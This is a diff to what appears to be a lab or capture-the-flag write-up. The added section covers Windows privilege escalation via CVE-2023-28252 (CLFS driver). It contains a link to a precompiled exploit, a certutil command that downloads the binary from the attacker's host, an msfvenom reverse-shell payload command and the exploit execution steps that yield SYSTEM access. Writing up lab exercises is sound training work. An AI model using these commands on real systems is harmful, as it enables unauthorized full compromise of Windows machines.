@@ -119,5 +119,35 @@ Once the files were successfully uploaded, we received our shell on our listener
 
 ![shell](Images/shell.png)
 
+## Privilege Escalation
 
+Post-compromise enumeration idenitified a file name `CVE-2023-28252_Summary.pdf` in the `C:\Users\sam.emerson\Documents` directory. Further research revealed a publicly available precompiled proof-of-concept binary for this vulnerability. Execution of this binary confirmed that the target was vulnerable and could be successfully exploited. 
 
+Exploit source: https://github.com/bkstephen/Compiled-PoC-Binary-For-CVE-2023-28252
+
+![cve](Images/cve.png)
+
+CVE-2023-28252 is a Windows privilege escalation vulnerbility affecting the CLFS driver. It allows the attack the abuse improper memory handling to escalate privileges to SYSTEM-level access.
+
+After downloading the binary locally, it was transferred to the victim's machine and executed to verify the functionality of the exploit
+```
+certutil -urlcache -split -f http://10.10.14.178/clfs_eop.exe
+```
+```
+./clfs_eop.exe whoami
+```
+![whoami](Images/whoami.png)
+
+Once functionality was confirmed, an `msfvenom` payload was generated to obtain a reverse shell. The payload was transferred to the victim's machine and executed, while a Netcat listener was established on the attackers machine to recieve the connection. Successful execution resulted in a SYSTEM-level shell, achieving full system compromise.
+
+msfvenom payload
+```
+msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.178 LPORT=4445 -f exe > shell-x64.exe
+```
+
+Exploit execution
+```
+./clfs_eop.exe shell-x64.exe
+```
+
+![system](Images/system.png)
